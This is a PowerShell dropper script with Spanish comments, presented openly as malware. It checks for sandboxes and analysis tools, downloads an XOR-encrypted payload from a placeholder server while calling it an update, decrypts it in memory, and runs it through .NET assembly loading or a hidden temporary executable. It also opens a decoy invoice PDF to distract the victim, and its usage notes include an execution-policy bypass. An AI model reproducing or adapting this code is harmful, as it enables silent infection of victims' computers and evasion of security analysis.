# ========================================================================
# DROPPER AVANZADO - PowerShell Ofuscado
# ========================================================================
# Este dropper es más sofisticado:
# 1. Verifica que no esté siendo analizado (anti-sandbox)
# 2. Descarga payload encriptado
# 3. Desencripta en memoria (no toca disco)
# 4. Ejecuta con técnicas de injection
# 5. Abre documento decoy
#
# USO:
#   powershell -ExecutionPolicy Bypass -File advanced_dropper.ps1
#   O renombrar a .bat y llamar: powershell -File "%~f0"
# ========================================================================

# === CONFIGURACIÓN ===
$PayloadURL = "http://tu-servidor.com/update/payload.bin"
$XORKey = "Mi_Clave_Secreta_2024"  # Cambiar esto
$DecoyURL = "https://www.ejemplo.com/factura_real.pdf"

# === FUNCIÓN: Anti-Sandbox ===
function Test-Sandbox {
    # Verificar si estamos en VM o sandbox
    $checks = @(
        # Check 1: Verificar memoria RAM (sandbox suelen tener poca RAM)
        { (Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory -gt 4GB }
        
        # Check 2: Verificar uptime (sandbox se reinician frecuentemente)
        { (Get-Date) - (gcim Win32_OperatingSystem).LastBootUpTime -gt [TimeSpan]::FromMinutes(10) }
        
        # Check 3: Verificar procesos comunes de sandbox
        { -not (Get-Process | Where-Object { $_.Name -match "vmware|vbox|sandbox|wireshark" }) }
        
        # Check 4: Verificar si hay mouse movement (sandboxes automatizados no mueven mouse)
        { Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Cursor]::Position.X -ne 0 }
    )
    
    # Si algún check falla, probablemente es sandbox
    foreach ($check in $checks) {
        if (-not (& $check)) {
            return $false
        }
    }
    
    return $true
}

# === FUNCIÓN: XOR Decrypt ===
function Decrypt-Payload {
    param([byte[]]$Data, [string]$Key)
    
    $keyBytes = [System.Text.Encoding]::UTF8.GetBytes($Key)
    $result = New-Object byte[] $Data.Length
    
    for ($i = 0; $i -lt $Data.Length; $i++) {
        $result[$i] = $Data[$i] -bxor $keyBytes[$i % $keyBytes.Length]
    }
    
    return $result
}

# === FUNCIÓN: Reflective DLL Injection ===
function Invoke-ReflectivePEInjection {
    param([byte[]]$PEBytes)
    
    # Cargar el PE en memoria sin tocar disco
    # Esto usa técnicas avanzadas de PE loading
    # Por simplicidad, aquí usamos Assembly.Load para DLLs .NET
    # Para PE nativos, se necesitaría implementación completa de PE loader
    
    try {
        # Si es .NET assembly
        $assembly = [System.Reflection.Assembly]::Load($PEBytes)
        $entryPoint = $assembly.EntryPoint
        if ($entryPoint) {
            $entryPoint.Invoke($null, $null)
        }
    } catch {
        # Si es PE nativo, escribir a disco temporalmente
        $tempPath = "$env:TEMP\~tmp$PID.exe"
        [System.IO.File]::WriteAllBytes($tempPath, $PEBytes)
        Start-Process -FilePath $tempPath -WindowStyle Hidden
        
        # Eliminar después de 5 segundos
        Start-Sleep -Seconds 5
        Remove-Item $tempPath -Force -ErrorAction SilentlyContinue
    }
}

# === MAIN ===

Write-Host "[*] Iniciando verificaciones de seguridad..." -ForegroundColor Green

# Anti-Sandbox check
if (-not (Test-Sandbox)) {
    Write-Host "[!] Entorno sospechoso detectado. Abortando." -ForegroundColor Red
    # Abrir el PDF decoy y salir sin ejecutar payload
    Start-Process $DecoyURL
    exit
}

Write-Host "[*] Entorno seguro. Procediendo..." -ForegroundColor Green

# Descargar payload encriptado
try {
    Write-Host "[*] Descargando actualización..." -ForegroundColor Yellow
    
    $webClient = New-Object System.Net.WebClient
    $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0")
    $encryptedPayload = $webClient.DownloadData($PayloadURL)
    
    Write-Host "[*] Actualización descargada: $($encryptedPayload.Length) bytes" -ForegroundColor Green
    
} catch {
    Write-Host "[!] Error descargando: $_" -ForegroundColor Red
    exit
}

# Desencriptar payload
Write-Host "[*] Desencriptando..." -ForegroundColor Yellow
$payload = Decrypt-Payload -Data $encryptedPayload -Key $XORKey

# Ejecutar payload en memoria
Write-Host "[*] Ejecutando..." -ForegroundColor Yellow
Invoke-ReflectivePEInjection -PEBytes $payload

# Abrir documento decoy para distraer
Write-Host "[*] Abriendo documento..." -ForegroundColor Green
Start-Process $DecoyURL

Write-Host "[*] Completado. Cerrando..." -ForegroundColor Green
Start-Sleep -Seconds 2
